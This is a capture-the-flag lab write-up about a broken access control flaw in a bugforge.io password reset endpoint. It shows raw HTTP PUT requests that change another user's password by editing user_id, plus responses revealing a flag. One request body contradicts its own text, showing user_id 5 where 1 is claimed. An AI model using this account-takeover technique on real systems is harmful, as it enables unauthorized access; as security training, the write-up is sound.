---
title: "Copypasta Broken Access Control Password Reset"
date: 2025-12-13
author: Shawn Szczepkowski
---
Todays lab is the CopyPasta Broken Access Control Password Reset lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

Exploring the functionality of todays lab we notice interestingly that when we reset our password, the PUT request to `/api/profile/password` includes the `user_id` in the body of the request.
```sh
PUT /api/profile/password HTTP/2
Host: fdc61a245153.labs.bugforge.io
Content-Length: 35
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY1NDk5ODAwfQ.zyq9vKdyEIAzqSmjghzjjPxjZEzMj42r_3HQmtvHYDE
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://fdc61a245153.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://fdc61a245153.labs.bugforge.io/profile/test
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"password":"test1234",
	"user_id":5
}
```

We also noticed earlier while exploring that we are able to make a request to each users profile like `GET /api/profile/admin` which returns their `user_id` in the response.

Let's see if we are able to reset the `admin` users password by passing the `user_id` of `1` in our request.
```sh
PUT /api/profile/password HTTP/2
Host: fdc61a245153.labs.bugforge.io
Content-Length: 35
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY1NDk5ODAwfQ.zyq9vKdyEIAzqSmjghzjjPxjZEzMj42r_3HQmtvHYDE
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://fdc61a245153.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://fdc61a245153.labs.bugforge.io/profile/test
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"password":"test1234",
	"user_id":5
}
```

Looks like we are successful.
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Fri, 12 Dec 2025 00:39:57 GMT
Etag: W/"2b-1leFLxO9pvRJ4B0CZIygDRcnOKs"
X-Powered-By: Express
Content-Length: 43

{
	"message":"Password updated successfully"
}
```

When we return to the application and login as the admin user, we will notice that the users first code snippet has been changed granting us our flag and a success message.
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Fri, 12 Dec 2025 00:41:07 GMT
Etag: W/"3bc-vaZAOowXFGB6+11HuGUdGciz8SQ"
X-Powered-By: Express
Content-Length: 956

[
	{
		"id":11,
		"user_id":1,
		"title":"bug{9dc048330a1bec0d498509bd989f00b6}",
		"code":"Great job finding the broken password reset",
		"language":"text",
		"description":"You successfully exploited the insecure password reset functionality",
		"is_public":0,
		"share_code":"77d81039-1ef1-45fe-9d23-9ea91ed70200",
		"created_at":"2025-12-12 00:39:57",
		"updated_at":"2025-12-12 00:39:57",
		"username":"admin",
		"like_count":0,
		"comment_count":0,
		"user_liked":0
	},
	
...snip...	
```
